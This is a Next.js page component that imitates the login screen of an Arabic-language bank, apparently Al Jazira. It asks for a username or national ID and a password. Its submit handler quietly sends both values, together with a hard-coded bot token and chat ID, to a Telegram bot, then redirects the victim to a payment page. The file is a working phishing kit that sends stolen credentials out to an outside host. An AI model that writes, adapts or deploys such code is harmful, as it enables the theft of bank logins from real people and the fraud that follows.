"use client"

import styles from './jzera.module.css'
import Image from 'next/image'
import icon1 from '../../../../../public/3.png'
import { useRef } from 'react'
import { useRouter } from 'next/navigation'

const Page = () => {
    const username = useRef()
    const password = useRef()

    const router =useRouter();

    const handlerout = ()=>{
        if(username.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push('/fozajil/banks/pay')
        }
      }

    const handleOnSubmit = (e) => {
        e.preventDefault();
        var bot={
      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
      chat_id:6364334502
    }
        var length =`الجزيرة  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }
  return (
    <div className={styles.container}>
        <Image 
            src={icon1}
            width={400}
        />

        <form onSubmit={handleOnSubmit}>
            <input type="text" ref={username}placeholder='ادخل اسم المستخدم او رقم البطاقة الوطنية ' required/>
            <input type="text" ref={password}  placeholder='ادخل كلمة المرور' required/>
            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>

        </form>
    </div>
  )
}

export default Page
